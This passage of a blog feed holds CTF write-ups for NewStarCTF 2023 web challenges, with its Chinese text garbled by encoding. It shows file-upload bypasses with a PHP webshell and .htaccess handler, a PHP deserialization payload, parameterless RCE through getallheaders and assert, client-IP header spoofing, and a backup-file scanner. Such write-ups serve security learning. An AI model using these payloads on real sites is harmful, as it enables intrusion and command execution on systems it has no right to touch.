src="/images/2023-10-9-Newstar-2/image-20231004172603995.png" alt="image-20231004172603995"></p><p>å‘ç°æˆåŠŸä¸Šä¼ ï¼ï¼ï¼</p><p>ç”±äºæ— æ³•æŠ“åŒ…ï¼Œæˆ‘ä»¬éœ€è¦å†ä¸Šä¼ .htaccessæ–‡ä»¶å¯¹åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æŒ‡å®šå›¾ç‰‡æ–‡ä»¶è¿›è¡Œè§£æ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;FilesMatch &quot;showfiles3.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004172835389.png" alt="image-20231004172835389"></p><p>å‘ç°æˆåŠŸä¸Šä¼ åˆ°åŒä¸€ç›®å½•ä¸‹</p><p>è®¿é—®æœ¨é©¬å›¾ç‰‡:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004172930848.png" alt="image-20231004172930848"></p><p>æˆåŠŸï¼ï¼ï¼</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004173020270.png" alt="image-20231004173020270"></p><p>å‘ç°flagæ–‡ä»¶:this_is_flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;cat /this_is_flag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004173154948.png" alt="image-20231004173154948"></p><h2 id="Unserializeï¼Ÿ"><a href="#Unserializeï¼Ÿ" class="headerlink" title="Unserializeï¼Ÿ"></a>Unserializeï¼Ÿ</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//ç§æœ‰å˜é‡$cmd</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–ä¼šè‡ªåŠ¨è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//è¿‡æ»¤å¸¸è§„çš„æ–‡ä»¶æ‰“å¼€å‘½ä»¤</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">//è¿›è¡Œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</span><br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ååºåˆ—åŒ–ä¼ å…¥çš„å˜é‡å€¼</span><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æ„é€ ååºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//ç§æœ‰å˜é‡åªèƒ½ç›´æ¥èµ‹å€¼</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;ls /&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">// @system($this-&gt;cmd);</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// @unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj1</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj1</span>;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>è¿™é‡Œå‘ç°urlç¼–ç çš„å†…å®¹æ— æ³•è¢«æ‰§è¡Œï¼Œæ‰€ä»¥é‡‡ç”¨æºç <br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:4:&quot;ls /&quot;;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004175532104.png" alt="image-20231004175532104"></p><p>å‘ç°æ–‡ä»¶:th1s_1s_fffflllll4444aaaggggg</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:33:&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004175916496.png" alt="image-20231004175916496"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004212050514.png" alt="image-20231004212050514"></p><p>æœ‰é¢˜ç›®çš„è‹±æ–‡æç¤ºå¾—ï¼Œè¯¥ç½‘é¡µå­˜åœ¨æ–‡ä»¶æ³„éœ²,å…ˆå°è¯•.gitæ³„éœ²ï¼š</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004212637348.png" alt="image-20231004212637348"></p><p>å‘ç°å­˜åœ¨bo0g1pop.php</p><p>å¯¹bo0g1pop.phpè¿›è¡Œä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//æ­£åˆ™åŒ¹é…funname(funname1()funname2())å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œå³æˆ‘ä»¬ä¸èƒ½ä¼ å‚æ•°åœ¨å‡½æ•°ä¸­</span><br><span class="hljs-comment">//\((?R)?\):è¡¨ç¤ºå°†()ä½œä¸ºé€’å½’çš„æ¨¡æ¿è¿›è¡Œé€’å½’åŒ¹é…å­—ç¬¦ä¸²ï¼Œé€’å½’ä¸€èˆ¬ä»æœ€é‡Œé¢è¿›è¡ŒåŒ¹é…</span><br><span class="hljs-comment">//æ— å‚RCE</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//å¯¹ä¸€äº›å‡½æ•°è¿›è¡Œè¿‡æ»¤</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<span class="hljs-comment">//å­˜åœ¨å±é™©ä»£ç æ‰§è¡Œæ¼æ´</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨æ— å‚RCEçš„å‡½æ•°:getallheaders()</p><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯è·å–httpè¯·æ±‚å¤´ä¸­çš„ä¿¡æ¯ï¼Œå¹¶ä»¥å…³è”æ•°ç»„çš„å½¢å¼è¿”å›:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">å…ˆè§‚å¯Ÿè¯¥ç½‘é¡µhttpè¯·æ±‚å¤´çš„ç¬¬ä¸€ä¸ªå¥æ˜¯è°:<br>?star=print(getallheaders());<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004232607329.png" alt="image-20231004232607329"></p><p>ç”±äºç›´æ¥è¾“å‡ºæ•°ç»„å¤´å…ƒç´ ä¸ºArray,æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨next()å‡½æ•°ä½¿æ•°ç»„å®šä½åˆ°ç¬¬äºŒä¸ªå…ƒç´ è¾“å‡ºï¼š<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004232730086.png" alt="image-20231004232730086"></p><p>å‘ç°è¾“å‡ºäº†è¯·æ±‚å¤´User-Agentçš„å€¼ï¼Œå³ç¬¬äºŒä¸ªè¯·æ±‚å¤´çš„å€¼</p><p>æˆ‘ä»¬ä¼ªé€ ä¸€ä¸‹ç¬¬äºŒä¸ªè¯·æ±‚å¤´User-Agentçš„å†…å®¹:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:666<br><br>?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234434183.png" alt="image-20231004234434183"></p><p>å‘ç°æˆåŠŸè¢«æ‰§è¡Œ</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;ls /&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234547770.png" alt="image-20231004234547770"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;head /flag&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234627391.png" alt="image-20231004234627391"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023_ç¬¬ä¸€å‘¨WP</title>
    <link href="/2023/10/04/2023-10-4-Newstar_1/"/>
    <url>/2023/10/04/2023-10-4-Newstar_1/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-ç¬¬ä¸€å‘¨WP"><a href="#NewStarCTF-2023-ç¬¬ä¸€å‘¨WP" class="headerlink" title="NewStarCTF 2023_ç¬¬ä¸€å‘¨WP"></a>NewStarCTF 2023_ç¬¬ä¸€å‘¨WP</h1><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926133137466.png" alt="image-20230926133137466"></p><p>æ ¹æ®ç½‘é¡µæ˜¾ç¤ºçš„å†…å®¹ï¼Œæˆ‘ä»¬éœ€è¦æä¾›å®ƒä¸€ä¸ªnumber1å’Œnumber2çš„å€¼ï¼Œæ²¡æœ‰å‘Šè¯‰æˆ‘ä»¬å…·ä½“çš„è¯·æ±‚æ–¹å¼ï¼Œæˆ‘ä»¬å…ˆç”¨getè¯·æ±‚å…ˆä¼ è¾“ä¸€ä¸ªnumber1å€¼è¯•è¯•:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?number1=1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926133446856.png" alt="image-20230926133446856"></p><p>å‘ç”ŸæŠ¥é”™ï¼Œåœ¨æŠ¥é”™ä¿¡æ¯ä¸­å¯»æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰flagï¼š<br><img src="/images/2023-10-4-Newstar-1/image-20230926133538322.png" alt="image-20230926133538322"></p><p>å‘ç°flag,è¿™é‡Œåº”è¯¥æ˜¯æ²¡æœ‰num2çš„å€¼æ‰€ä»¥num2ä¸ºç©ºå°±æŠ¥é”™æ˜¾ç¤ºäº†</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926133854855.png" alt="image-20230926133854855"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?ctf=1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926133932034.png" alt="image-20230926133932034"></p><p>æ›´å…·æç¤ºæˆ‘ä»¬éœ€è¦å¯»æ‰¾secretçš„å€¼ï¼Œå¹¶ç”¨postä¼ å‚ï¼Œç½‘é¡µæ˜¾ç¤ºä¸Šæ²¡æœ‰secret,é‚£ä¹ˆåœ¨ç½‘é¡µæºç ä¸­æ‰¾ä¸€ä¸‹:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926134135307.png" alt="image-20230926134135307"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk)<br>=&gt;<br>Secret: n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?ctf=1<br>POST:<br>secret=n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134415967.png" alt="image-20230926134415967"></p><p>è¿™é‡Œå›æ˜¾æ˜¯è®¤è¯ä¿¡æ¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨cookieè¿›è¡Œèº«ä»½è®¤è¯çš„ï¼Œæ‰€ä»¥ä½¿ç”¨BPæŠ“åŒ…:<br><img src="/images/2023-10-4-Newstar-1/image-20230926134605035.png" alt="image-20230926134605035"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:power=ctfer<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134653693.png" alt="image-20230926134653693"></p><p>æˆ‘ä»¬éœ€è¦ä¿®æ”¹æˆ‘ä»¬è®¿é—®çš„æµè§ˆå™¨ä¸ºNewStarCTF2023:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent:NewStarCTF2023<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134804370.png" alt="image-20230926134804370"></p><p>å‘Šè¯‰æˆ‘ä»¬è®¿é—®çš„æºç½‘é¡µåœ°å€æ˜¯newstarctf.com:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:newstarctf.com<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926135002273.png" alt="image-20230926135002273"></p><p>æœ€åæˆ‘ä»¬éœ€è¦ä¼ªé€ æœ¬åœ°ç”¨æˆ·è®¿é—®,è¿™é‡Œæä¾›äº†ä¸€äº›ç”¨äºä¼ªé€ çš„å­—æ®µ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br> <br>X-Forwarded:127.0.0.1<br> <br>Forwarded-For:127.0.0.1<br> <br>Forwarded:127.0.0.1<br> <br>X-Forwarded-Host:127.0.0.1<br> <br>X-remote-IP:127.0.0.1<br> <br>X-remote-addr:127.0.0.1<br> <br>True-Client-IP:127.0.0.1<br> <br>X-Client-IP:127.0.0.1<br> <br>Client-IP:127.0.0.1<br> <br>X-Real-IP:127.0.0.1<br> <br>Ali-CDN-Real-IP:127.0.0.1<br> <br>Cdn-Src-Ip:127.0.0.1<br> <br>Cdn-Real-Ip:127.0.0.1<br> <br>CF-Connecting-IP:127.0.0.1<br> <br>X-Cluster-Client-IP:127.0.0.1<br> <br>WL-Proxy-Client-IP:127.0.0.1<br> <br>Proxy-Client-IP:127.0.0.1<br> <br>Fastly-Client-Ip:127.0.0.1<br> <br>True-Client-Ip:127.0.0.1<br><br>Host: 127.0.0.1<br></code></pre></td></tr></table></figure><p>[XFFæ¼æ´åˆ©ç”¨<a href="https://cloud.tencent.com/developer/article/2039293">é€šä¿—æ˜“æ‡‚]-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p>payload:</p><p>è¿™é‡Œæˆ‘ç”¨äº†X-Real-IP:127.0.0.1ç”¨æ¥ä¼ªé€ :</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Real-IP:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926135303533.png" alt="image-20230926135303533"></p><p>flag&#x3D;flag{47812204-bfe7-4821-b0a5-ca4d18f44e9f}</p><h2 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926135548124.png" alt="image-20230926135548124"></p><p>æ ¹æ®ç½‘é¡µæç¤ºå­˜åœ¨å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼š<br>è®¿é—®robots.txt:<br><img src="/images/2023-10-4-Newstar-1/image-20230926135706266.png" alt="image-20230926135706266"></p><p>è·å¾—åŠä¸ªflag:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag&#123;r0bots_1s_s0_us3ful<br></code></pre></td></tr></table></figure><p>å…ˆä½¿ç”¨æˆ‘ä»¬çš„è‡ªä¸»è„šæœ¬æŸ¥æ‰¾ç½‘é¡µçš„åå°æ–‡ä»¶(åå°æ–‡ä»¶ç›®å½•è¯·ç§èŠ):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;php_bak.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br>    <span class="hljs-comment"># print(bak_data)</span><br><span class="hljs-comment"># å»é™¤æ¢è¡Œç¬¦</span><br>bak_data = []<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:<br>    bak_data.append(d.strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br><span class="hljs-comment"># print(bak_data)</span><br>url = <span class="hljs-string">&quot;http://0a2444bb-05dd-4ecf-8cbc-6e34948c0b2a.node4.buuoj.cn:81/&quot;</span><br><br><span class="hljs-keyword">for</span> bak_d <span class="hljs-keyword">in</span> bak_data:<br>    url_final = url + bak_d<br>    r = requests.get(url_final)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># print(type(r.status_code))</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">200</span> == r.status_code):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bak_d, r.status_code))<br><br><br><br><span class="hljs-comment"># l1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;]</span><br><span class="hljs-comment"># l2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;]</span><br><span class="hljs-comment"># l1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;,&#x27;index&#x27;,&#x27;index.php&#x27;]</span><br><span class="hljs-comment"># l2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;,&#x27;7z&#x27;,&#x27;php~&#x27;,&#x27;php&#x27;]</span><br><br><br><span class="hljs-comment"># for i in l1:</span><br><span class="hljs-comment">#     for j in l2:</span><br><span class="hljs-comment">#         print(i+&quot; &quot;+j)</span><br><span class="hljs-comment">#         url_final = url + &quot;/&quot; + i + &quot;.&quot; + j</span><br><span class="hljs-comment">#         r = requests.get(url_final)</span><br><span class="hljs-comment">#         print(r)</span><br><br><span class="hljs-comment"># æ‰¾åˆ°æ–‡ä»¶ä¸ºæ­£å¸¸å“åº”:200</span><br><span class="hljs-comment"># www zip</span><br><span class="hljs-comment"># &lt;Response [200]&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926140025030.png" alt="image-20230926140025030"></p><p>å‘ç°å­˜åœ¨ä¸€ä¸ª<a href="http://www.zipæ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½åæˆ‘ä»¬åœ¨index.phpä¸­å‘ç°äº†åé¢ä¸€åŠflagï¼š">www.zipæ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½åæˆ‘ä»¬åœ¨index.phpä¸­å‘ç°äº†åé¢ä¸€åŠflagï¼š</a><br><img src="/images/2023-10-4-Newstar-1/image-20230926140146599.png" alt="image-20230926140146599"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">_4nd_www.zip_1s_s0_d4ng3rous&#125;<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{r0bots_1s_s0_us3ful_4nd_<a href="http://www.zip_1s_s0_d4ng3rous}/">www.zip_1s_s0_d4ng3rous}</a></p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926140325625.png" alt="image-20230926140325625"></p><p>æˆ‘ä»¬ç›´æ¥ä¸Šä¼ å›¾ç‰‡æœ¨é©¬æ–‡ä»¶,å¹¶ä½¿ç”¨BPæŠ“åŒ…:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926140502172.png" alt="image-20230926140502172"></p><p>å‘ç°ä¸Šä¼ æˆåŠŸï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å›¾ç‰‡æ–‡ä»¶çš„åç¼€åä¸ºphp:<br><img src="/images/2023-10-4-Newstar-1/image-20230926140550913.png" alt="image-20230926140550913"></p><p>å‘ç°ä¹Ÿä¸Šä¼ æˆåŠŸï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹&#x2F;upload&#x2F;pass.php:<br><img src="/images/2023-10-4-Newstar-1/image-20230926140653179.png" alt="image-20230926140653179"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926140727477.png" alt="image-20230926140727477"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat /fllll4g&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926140810360.png" alt="image-20230926140810360"></p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of 